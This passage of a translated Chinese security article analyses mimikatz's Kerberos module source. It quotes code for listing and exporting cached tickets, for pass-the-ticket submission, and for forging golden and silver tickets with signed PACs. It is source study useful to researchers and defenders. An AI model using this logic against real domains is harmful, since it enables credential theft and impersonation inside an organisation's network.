# mimikatz源码学习-Kerberos模块
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> mimikatz是内网渗透中的一大利器，本文主要讨论学习mimikatz中与Kerberos协议相关的代码
mimikatz的Kerberos模块中常用大概为：
1、 `kerberos::list` ：列出当前的所有票据（当前用户所在session，效果等同于命令`klist`）  
2、`kerberos::ptt` ：Pass The Ticket，即票据传递  
3、`kerberos::golden` ：伪造票据，如黄金票据、白银票据
## LsaCallKerberosPackage
`LsaCallKerberosPackage`是`ntsecapi.h`下的一个API，MSDN对它的描述如下：
> The LsaCallAuthenticationPackage function is used by a logon application to
> communicate with an authentication package.  
>  This function is typically used to access services provided by the
> authentication package.
大意为这个函数用作登录程序和身份认证包通信，但通常被用来访问身份认证包提供的服务。在mimikatz的源码中列出票据和票据传递两个功能模块都围绕这个函数展开，通过传递不同的参数得到不同的执行结果。
函数原型如下：
    NTSTATUS LsaCallAuthenticationPackage(
      HANDLE    LsaHandle, 
      ULONG     AuthenticationPackage, // 提供身份认证的标识符
      PVOID     ProtocolSubmitBuffer, // 用于传递给身份验证包的缓冲区
      ULONG     SubmitBufferLength,
      PVOID     *ProtocolReturnBuffer, // 接收从验证包返回的数据的缓冲区
      PULONG    ReturnBufferLength,
      PNTSTATUS ProtocolStatus
    );
###  列出票据
mimikatz的源码中这个功能对应的代码比较简单，只是调用了`LsaCallAuthenticationPackage`，然后对返回的数据进行解析：
    status = LsaCallKerberosPackage(&kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID *) &pKerbCacheResponse, &szData, &packageStatus);
      if(NT_SUCCESS(status))
      {
        if(NT_SUCCESS(packageStatus))
        {
          for(i = 0; i CountOfTickets; i++)
          {
            kprintf(L"\n[%08x] - 0x%08x - %s", i, pKerbCacheResponse->Tickets[i].EncryptionType, kuhl_m_kerberos_ticket_etype (pKerbCacheResponse->Tickets[i].EncryptionType));
            kprintf(L"\n   Start/End/MaxRenew: ");
            kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].StartTime); kprintf(L" ; ");
            kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].EndTime); kprintf(L" ; ");
            kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].RenewTime);
            kprintf(L"\n   Server Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ServerName, &pKerbCacheResponse->Tickets[i]. ServerRealm);
            kprintf(L"\n   Client Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ClientName, &pKerbCacheResponse->Tickets[i]. ClientRealm);
            kprintf(L"\n   Flags %08x    : ", pKerbCacheResponse->Tickets[i].TicketFlags);
            kuhl_m_kerberos_ticket_displayFlags(pKerbCacheResponse->Tickets[i].TicketFlags);
注意到，mimikatz使用`LsaCallKerberosPackage`对`LsaCallAuthenticationPackage`做了简要封装，实际上省去了前两个参数，前两个参数被当作全局变量在初始化时完成赋值，所以这里我们只需要关注函数执行之后返回的数据，代码中对应为变量`pKerbCacheResponse`，变量对应的结构体在MSDN中描述如下：
    typedef struct _KERB_QUERY_TKT_CACHE_RESPONSE {
      KERB_PROTOCOL_MESSAGE_TYPE MessageType;
      ULONG                      CountOfTickets;  // 数组Tickets中的票据数量
      KERB_TICKET_CACHE_INFO     Tickets[ANYSIZE_ARRAY]; 
    } KERB_QUERY_TKT_CACHE_RESPONSE, *PKERB_QUERY_TKT_CACHE_RESPONSE;
其中，结构体`KERB_TICKET_CACHE_INFO`描述如下，用来描述缓存的Kerberos票据相关信息：
    typedef struct _KERB_TICKET_CACHE_INFO {
      UNICODE_STRING ServerName;
      UNICODE_STRING RealmName;
      LARGE_INTEGER  StartTime;
      LARGE_INTEGER  EndTime;
      LARGE_INTEGER  RenewTime;
      LONG           EncryptionType;
      ULONG          TicketFlags;
    } KERB_TICKET_CACHE_INFO, *PKERB_TICKET_CACHE_INFO;
导出票据时同样是调用这个API，只是这时我们需要关注用于传递请求的参数，即`LsaCallAuthenticationPackage`的第三个参数`ProtocolSubmitBuffer`，对应的结构体在MSDN中描述为：
    typedef struct _KERB_RETRIEVE_TKT_REQUEST {
      KERB_PROTOCOL_MESSAGE_TYPE MessageType;
      LUID                       LogonId;
      UNICODE_STRING             TargetName; // 目标服务名
      ULONG                      TicketFlags; // 用于标记票据用途
      ULONG                      CacheOptions; // 搜索缓存的选项，KERB_RETRIEVE_TICKET_AS_KERB_CRED表示以Keberos凭证的形式返回票据
      LONG                       EncryptionType;
      SecHandle                  CredentialsHandle;
    } KERB_RETRIEVE_TKT_REQUEST, *PKERB_RETRIEVE_TKT_REQUEST;
对应的，用于接收请求的票据用结构体`_KERB_RETRIEVE_TKT_RESPONSE`描述，该结构体只包含一个成员结构体`KERB_EXTERNAL_TICKET`，而这个结构体的成员`EncodedTicketSize`和`EncodedTicket`分别为返回的票据大小和票据内容。
其实不难发现，仅需要查询缓存中的票据时，使用结构体`KERB_QUERY_TKT_CACHE_REQUEST`和`KERB_QUERY_TKT_CACHE_RESPONSE`并且用于请求的结构体变量置零即可；但是想要获取票据内容时就需要使用结构体`KERB_RETRIEVE_TKT_REQUEST`和`KERB_RETRIEVE_TKT_RESPONSE`了，与查询不同，获取票据内容时需要在请求中指明请求的类型（`MessageType`）、搜索缓存的选项（`CacheOptions`）、票据标志（`TicketFlags`）、目标服务名（`TargetName`）。
不过需要注意的是，结构体成员中`UNICODE_STRING`对应的是结构体类型，其定义如下：
    typedef struct _UNICODE_STRING {
      USHORT Length;
      USHORT MaximumLength;
      PWSTR  Buffer;
    } UNICODE_STRING, *PUNICODE_STRING;
所以，对`TargetName`赋值时，需要单独的一块空间存放Buffer对应的值，mimikatz的处理如下：
    szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse->Tickets[i].ServerName.MaximumLength;
    if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
    ...
    ...
    ...
    pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, pKerbCacheResponse->Tickets[i].ServerName.Buffer, pKerbRetrieveRequest->TargetName.MaximumLength);
此处的思路是header+content，这样做可以保证数据在同一块内存中，避免申请多块内存。
至此，其实列出缓存中的票据以及导出票据的分析已经结束，但是我们还忽略了两个参数，即在mimikatz中以全局变量的形式传入的句柄和身份认证包标识。MSDN的句柄`LsaHandle`的描述为从与调用函数
`LsaRegisterLogonProcess` 或
`LsaConnectUntrusted`获得，而身份认证包标识是从函数`LsaLookupAuthenticationPackage`中获取，mimikatz中的代码也确实如此：
    NTSTATUS status = LsaConnectUntrusted(&g_hLSA);
      if(NT_SUCCESS(status))
      {
        status = LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
        g_isAuthPackageKerberos = NT_SUCCESS(status);
其中，`kerberosPackageName`为结构体`LSA_STRING`类型的变量，赋值为`MICROSOFT_KERBEROS_NAME_A`，指定为ANSI版本的Kerberos身份认证包名称。
如果要清空缓存，就需要用到结构体`_KERB_PURGE_TKT_CACHE_REQUEST`了，它描述了想要删除的缓存票据的信息，在MSDN中的定义如下：
    typedef struct _KERB_PURGE_TKT_CACHE_REQUEST {
      KERB_PROTOCOL_MESSAGE_TYPE MessageType;
      LUID                       LogonId;
      UNICODE_STRING             ServerName;
      UNICODE_STRING             RealmName;
    } KERB_PURGE_TKT_CACHE_REQUEST, *PKERB_PURGE_TKT_CACHE_REQUEST;
其中需要注意的是第一个成员（`MessageType`)， **必须** 设置为`KerbPurgeTicketCacheMessage`。
###  票据传递
票据传递部分同样是使用`LsaCallAuthenticationPackage`，只不过这次使用的结构体是`KERB_SUBMIT_TKT_REQUEST`，在`NTSecAPI.h`中对该结构体的定义如下：
    typedef struct _KERB_SUBMIT_TKT_REQUEST {
        KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        LUID LogonId;
        ULONG Flags;
        KERB_CRYPTO_KEY32 Key; // key to decrypt KERB_CRED
        ULONG KerbCredSize;
        ULONG KerbCredOffset;
    } KERB_SUBMIT_TKT_REQUEST, *PKERB_SUBMIT_TKT_REQUEST;
关于这个结构体的描述在MSDN中似乎没有发现，不过根据其他结构体和字段的命名不难猜测相应字段的含义。对比mimikatz源码来看其实只需要设置三部分内容，一是`MessageType`，这里需要设置为固定内容：`KerbSubmitTicketMessage`；剩下的两部分内容即票据对应的大小和位置（因为票据数据是追加在结构体后的，所以这里偏移是结构体的大小），设置完之后调用函数`LsaCallAuthenticationPackage`即可完成票据传递：
    submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
    if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
    {
      pKerbSubmit->MessageType = KerbSubmitTicketMessage;
      pKerbSubmit->KerbCredSize = dataSize;
      pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
      RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, data, dataSize);
      status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
## 伪造票据
mimikatz中描述票据的结构体定义如下：
    typedef struct _KIWI_KERBEROS_TICKET {
      PKERB_EXTERNAL_NAME  ServiceName;
      LSA_UNICODE_STRING   DomainName;
      PKERB_EXTERNAL_NAME  TargetName;
      LSA_UNICODE_STRING   TargetDomainName;
      PKERB_EXTERNAL_NAME  ClientName;
      LSA_UNICODE_STRING   AltTargetDomainName;
      LSA_UNICODE_STRING Description;
      FILETIME StartTime;
      FILETIME EndTime;
      FILETIME RenewUntil;
      LONG  KeyType;
      KIWI_KERBEROS_BUFFER  Key;
      ULONG  TicketFlags;
      LONG   TicketEncType;
      ULONG  TicketKvno;
      KIWI_KERBEROS_BUFFER  Ticket;
    } KIWI_KERBEROS_TICKET, *PKIWI_KERBEROS_TICKET;
从结构体定义其实可以看出ticket所包含的内容，在Kerberos认证中,以AS-REP为例，我们知道AS返回给用户两部分内容:
一是TGT,二是使用用户密码hash加密的session key。其中，TGT包含了session
key（登录会话密匙）、失效时间以及pac信息（特权属性证书）等内容，不过在mimikatz中pac信息是单独生成的，所以上述的结构体定义中并不包含这部分内容。
从生成票据的代码流程来看，生成TGT和TGS的代码基本一致，最后会生成哪种票据取决于传递的参数，比如TGT需要krbtgt的哈希而TGS需要请求的服务。代码中生成票据的代码主要是函数`kuhl_m_kerberos_golden_data`，首先根据传入的参数完成上述定义的ticket结构体的初始化，然后根据是否传入sid来决定是否生成签名的pac：
    if(sid) // we want a PAC !
    {
      if(pValidationInfo = kuhl_m_pac_infoToValidationInfo(&lifetime->TicketStart, username, domainname, LogonDomainName, sid, userid, groups, cbGroups, sids, cbSids))
      {
        if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet, &pacType, &pacTypeSize))
        {
          kprintf(L" * PAC generated\n");
          status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
          if(NT_SUCCESS(status))
            kprintf(L" * PAC signed\n");
        }
      }
    }
随后就是生成对应的ticket，详细来讲就是先按照固定格式生成要加密的内容，然后对这部分内容加密，最后返回加密的结果。对于加密部分，围绕一个重要函数：`CDLocateCSystem`，他第二个参数传入的是结构体，这个结构体包含了指向加解密函数的指针等信息，定义如下：